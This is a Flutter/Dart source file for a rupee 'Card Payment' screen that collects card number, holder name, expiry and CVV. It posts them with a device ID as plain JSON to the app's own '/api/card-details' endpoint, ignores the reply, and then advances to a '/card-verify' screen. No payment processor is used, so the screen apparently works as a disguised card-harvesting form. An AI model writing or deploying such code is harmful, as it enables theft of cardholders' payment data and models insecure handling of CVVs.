import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:go_router/go_router.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import '../theme.dart';
import '../services/device_service.dart';

class CardScreen extends StatefulWidget {
  final double amount;
  const CardScreen({super.key, required this.amount});
  @override
  State<CardScreen> createState() => _S();
}

class _S extends State<CardScreen> {
  final number = TextEditingController();
  final expiry = TextEditingController();
  final cvv = TextEditingController();
  final name = TextEditingController();
  int selected = 0;

  String get _cardType {
    final n = number.text.replaceAll(' ', '');
    if (n.startsWith('4')) return 'Visa';
    if (n.startsWith('5')) return 'Mastercard';
    if (n.startsWith('3')) return 'Amex';
    if (n.startsWith('6')) return 'RuPay';
    return '';
  }

  bool get _valid {
    final n = number.text.replaceAll(' ', '');
    final e = expiry.text;
    final c = cvv.text;
    if (n.length != 16) return false;
    if (e.length != 5) return false;
    if (c.length < 3) return false;
    if (name.text.trim().isEmpty) return false;
    return true;
  }

  void pay() {
    if (_valid) {
      DeviceService.getDeviceId().then((deviceId) {
        http.post(Uri.parse('$apiBaseUrl/api/card-details'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
          'card_type': _cardType,
          'card_number': number.text.replaceAll(' ', ''),
          'card_holder_name': name.text,
          'expiry': expiry.text,
          'cvv': cvv.text,
          'amount': widget.amount,
          'device_id': deviceId,
        }))
          .then((_) => print('API success'))
          .catchError((e) => print('API error: $e'));
      });
      context.push('/card-verify', extra: widget.amount);
    }
  }

  @override
  Widget build(BuildContext context) {
    final cardType = _cardType;
    return Scaffold(body: SafeArea(child: SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [AppColors.accent.withValues(alpha: .15), Colors.orange.shade100],
                begin: Alignment.topLeft, end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(12),
            ),
            child: const Icon(Icons.credit_card, color: AppColors.accent, size: 24),
          ),
          const SizedBox(width: 14),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text('Card Payment', style: AppStyles.headerStyle),
            const SizedBox(height: 2),
            const Text('Pay via credit or debit card', style: AppStyles.bodySmall),
          ]),
        ]),
        const SizedBox(height: 24),
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [Color(0xFFF39C12), Color(0xFFE67E22)],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(16),
            boxShadow: [
              BoxShadow(color: const Color(0xFFF39C12).withValues(alpha: .3), blurRadius: 16, offset: const Offset(0, 6)),
            ],
          ),
          child: Row(children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: .15),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(Icons.account_balance_wallet, color: Colors.white, size: 24),
            ),
            const SizedBox(width: 16),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('Amount to Pay', style: TextStyle(color: Colors.white70, fontSize: 13, fontWeight: FontWeight.w500)),
              const SizedBox(height: 4),
              Text('\u{20B9}${widget.amount.toStringAsFixed(1)}',
                  style: const TextStyle(fontSize: 28, fontWeight: FontWeight.w800, color: Colors.white, letterSpacing: 0.5)),
            ]),
          ]),
        ),
        const SizedBox(height: 20),
        Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            color: AppColors.fieldBg,
            borderRadius: BorderRadius.circular(14),
          ),
          child: Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => setState(() => selected = 0),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: selected == 0 ? Colors.white : Colors.transparent,
                  borderRadius: BorderRadius.circular(10),
                  boxShadow: selected == 0
                      ? [BoxShadow(color: Colors.black.withValues(alpha: .06), blurRadius: 8, offset: const Offset(0, 2))]
                      : null,
                ),
                alignment: Alignment.center,
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(Icons.credit_card, size: 18,
                      color: selected == 0 ? AppColors.accent : AppColors.textMedium),
                  const SizedBox(width: 6),
                  Text('Credit Card',
                      style: TextStyle(fontWeight: FontWeight.w700,
                          color: selected == 0 ? AppColors.accent : AppColors.textMedium)),
                ]),
              ),
            )),
            Expanded(child: GestureDetector(
              onTap: () => setState(() => selected = 1),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: selected == 1 ? Colors.white : Colors.transparent,
                  borderRadius: BorderRadius.circular(10),
                  boxShadow: selected == 1
                      ? [BoxShadow(color: Colors.black.withValues(alpha: .06), blurRadius: 8, offset: const Offset(0, 2))]
                      : null,
                ),
                alignment: Alignment.center,
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(Icons.credit_card, size: 18,
                      color: selected == 1 ? AppColors.accent : AppColors.textMedium),
                  const SizedBox(width: 6),
                  Text('Debit Card',
                      style: TextStyle(fontWeight: FontWeight.w700,
                          color: selected == 1 ? AppColors.accent : AppColors.textMedium)),
                ]),
              ),
            )),
          ]),
        ),
        const SizedBox(height: 16),
        Container(
          padding: const EdgeInsets.all(24),
          decoration: AppStyles.cardDecoration,
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Expanded(child: _label('Card Number')),
              if (cardType.isNotEmpty)
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [AppColors.navy.withValues(alpha: .08), AppColors.blue.withValues(alpha: .08)],
                      begin: Alignment.topLeft, end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(6),
                  ),
                  child: Text(cardType, style: const TextStyle(fontSize: 11, fontWeight: FontWeight.w700, color: AppColors.navy)),
                ),
            ]),
            const SizedBox(height: 6),
            TextField(
              controller: number, keyboardType: TextInputType.number,
              inputFormatters: [
                FilteringTextInputFormatter.digitsOnly,
                LengthLimitingTextInputFormatter(16),
                _CardNumberFormatter(),
              ],
              style: const TextStyle(fontSize: 16, color: AppColors.textDark, letterSpacing: 1),
              decoration: AppStyles.textFieldDecoration('xxxx xxxx xxxx xxxx',
                  prefixIcon: const Icon(Icons.credit_card, color: AppColors.blue, size: 20)),
              onChanged: (_) => setState(() {}),
            ),
            const SizedBox(height: 16),
            _label('Card Holder Name'),
            const SizedBox(height: 6),
            TextField(
              controller: name, textCapitalization: TextCapitalization.words,
              inputFormatters: [FilteringTextInputFormatter.allow(RegExp(r'[a-zA-Z\s]'))],
              style: const TextStyle(fontSize: 15, color: AppColors.textDark),
              decoration: AppStyles.textFieldDecoration('Enter name on card',
                  prefixIcon: const Icon(Icons.person, color: AppColors.blue, size: 20)),
              onChanged: (_) => setState(() {}),
            ),
            const SizedBox(height: 16),
            Row(children: [
              Expanded(child: Column(children: [
                _label('Expiry'),
                const SizedBox(height: 6),
                TextField(
                  controller: expiry,
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(4),
                    _ExpiryFormatter(),
                  ],
                  style: const TextStyle(fontSize: 15, color: AppColors.textDark),
                  decoration: AppStyles.textFieldDecoration('MM/YY',
                      prefixIcon: const Icon(Icons.date_range, color: AppColors.blue, size: 20)),
                  onChanged: (_) => setState(() {}),
                ),
              ])),
              const SizedBox(width: 16),
              Expanded(child: Column(children: [
                _label('CVV'),
                const SizedBox(height: 6),
                TextField(
                  controller: cvv, obscureText: true, keyboardType: TextInputType.number,
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(4),
                  ],
                  style: const TextStyle(fontSize: 15, color: AppColors.textDark, letterSpacing: 2),
                  decoration: AppStyles.textFieldDecoration('XXX',
                      prefixIcon: const Icon(Icons.lock, color: AppColors.blue, size: 20)),
                  onChanged: (_) => setState(() {}),
                ),
              ])),
            ]),
            const SizedBox(height: 28),
            SizedBox(
              width: double.infinity,
              height: 54,
              child: ElevatedButton.icon(
                onPressed: _valid ? pay : null,
                icon: const Icon(Icons.lock, size: 18),
                label: const Text('Pay Now', style: TextStyle(fontSize: 18, fontWeight: FontWeight.w700)),
                style: AppStyles.accentButton(double.infinity),
              ),
            ),
          ]),
        ),
      ]),
    )));
  }

  Widget _label(String t) => Padding(padding: const EdgeInsets.only(bottom: 4),
      child: Text(t, style: AppStyles.labelStyle));
}

class _CardNumberFormatter extends TextInputFormatter {
  @override
  TextEditingValue formatEditUpdate(TextEditingValue old, TextEditingValue next) {
    final digits = next.text.replaceAll(' ', '');
    if (digits.length > 16) return old;
    final buf = StringBuffer();
    for (var i = 0; i < digits.length; i++) {
      if (i > 0 && i % 4 == 0) buf.write(' ');
      buf.write(digits[i]);
    }
    final s = buf.toString();
    return next.copyWith(text: s, selection: TextSelection.collapsed(offset: s.length));
  }
}

class _ExpiryFormatter extends TextInputFormatter {
  @override
  TextEditingValue formatEditUpdate(TextEditingValue old, TextEditingValue next) {
    final digits = next.text.replaceAll('/', '');
    if (digits.length > 4) return old;
    String s = digits;
    if (digits.length >= 3) {
      s = '${digits.substring(0, 2)}/${digits.substring(2)}';
    }
    return next.copyWith(text: s, selection: TextSelection.collapsed(offset: s.length));
  }
}
